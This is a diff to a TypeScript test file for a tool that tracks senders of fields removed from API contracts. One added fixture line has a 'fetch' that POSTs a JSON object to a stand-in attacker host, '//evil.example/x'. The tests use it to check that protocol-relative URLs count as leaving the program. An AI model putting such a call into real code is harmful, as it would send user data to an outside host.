@@ -7,6 +7,7 @@ import { writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { expect, plantedTsconfig, test } from "@orb/testkit/tooling";
 import { execFixtureGit, FIXTURE_GIT_IDENTITY } from "@orb/tooling/floor/git/git-fixture";
+import { NO_DESTINATION, OUTSIDE_PROGRAM } from "../../../tooling/src/unwired/graph/removed-keys.ts";
 import type { RemovedKeysReport } from "../../../tooling/src/unwired/index.ts";
 import { removedKeysGraph } from "../../../tooling/src/unwired/index.ts";
 import { graphTree, LIB, WORLD, ZOD_STUB } from "./_planted.ts";
@@ -21,12 +22,18 @@ const BEFORE = [
   "  readonly chatId: string;",
   "  readonly guidedPick?: string;",
   "}",
+  "export interface EditInput {",
+  "  readonly guidedPick?: string;",
+  "}",
   "export const listInputSchema = z.object({ limit: z.string(), pageLimit: z.string().optional() });",
 ].join("\n");
 const AFTER = [
   'import { z } from "../z.ts";',
   "export interface SendInput {",
   "  readonly chatId: string;",
+  "}",
+  "export interface EditInput {",
+  "  readonly guidedPick?: string;",
   "}",
   "export const listInputSchema = z.object({ limit: z.string() });",
 ].join("\n");
@@ -57,10 +64,6 @@ const TRPC = [
   "  };",
   "};",
 ].join("\n");
-// The reason an open slot that reaches none of our procedures or routes is listed with.
-const NO_DESTINATION = "open slot reaching none of our procedures or routes";
-// The reason a receiver file the merged program does not load is listed with.
-const OUTSIDE_PROGRAM = "outside the merged program";
 
 const commit = (repo: string, files: Readonly<Record<string, string>>, message: string): void => {
   for (const [file, text] of Object.entries(files)) {
@@ -145,6 +148,21 @@ test("a same-named field of another shape is another member, and passes", { time
   expect(report.failed).toBe(false);
 });
 
+// The kept twin sits in the same contract file as the shape that dropped the key, so only the home's span tells them apart.
+test("a write of the key on a same-file shape that kept it is another member, and passes", { timeout: 120_000 }, async ({ plantedTree }) => {
+  const repo = await deletionBranch(plantedTree, {
+    "packages/client/src/send.ts": [
+      'import type { EditInput } from "../../contracts/src/chat/send.ts";',
+      "export const edit: EditInput = { guidedPick: 'g' };",
+    ].join("\n"),
+  });
+  const report = await check(repo);
+  const guidedPick = entry(report, "guidedPick");
+  expect(guidedPick?.homes).toEqual([`${CONTRACT}:SendInput`]);
+  expect([guidedPick?.senders.length, guidedPick?.other]).toEqual([0, 1]);
+  expect(report.failed).toBe(false);
+});
+
 test("a key moved to another declaration fails a sender of its old home only", { timeout: 120_000 }, async ({ plantedTree }) => {
   const repo = await deletionBranch(plantedTree, {
     "packages/client/src/send.ts": [
@@ -187,6 +205,10 @@ test("a loose object handed to one of our procedures is a loose sender and fails
     "  const intent: Record<string, unknown> = {};",
     '  intent["guidedPick"] = "g";',
     "  await fetch('https://elsewhere.example/report', { method: 'POST', body: JSON.stringify(intent) });",
+    // A protocol-relative URL names another origin, never our own route.
+    "  const relative: Record<string, unknown> = {};",
+    '  relative["guidedPick"] = "g";',
+    "  await fetch('//evil.example/x', { method: 'POST', body: JSON.stringify(relative) });",
     "}",
   ].join("\n");
   const failing = await check(await deletionBranch(plantedTree, { "tests/e2e/send.spec.ts": sender }));
@@ -194,7 +216,10 @@ test("a loose object handed to one of our procedures is a loose sender and fails
   expect(failing.failed).toBe(true);
   const passing = await check(await deletionBranch(plantedTree, { "tests/e2e/send.spec.ts": outside }));
   expect(entry(passing, "guidedPick")?.loose).toEqual([]);
-  expect(entry(passing, "guidedPick")?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([`tests/e2e/send.spec.ts:3 ${NO_DESTINATION}`]);
+  expect(entry(passing, "guidedPick")?.unresolved.map(({ at, reason }) => `${at} ${reason}`)).toEqual([
+    `tests/e2e/send.spec.ts:3 ${NO_DESTINATION}`,
+    `tests/e2e/send.spec.ts:6 ${NO_DESTINATION}`,
+  ]);
   expect(passing.failed).toBe(false);
 });
 
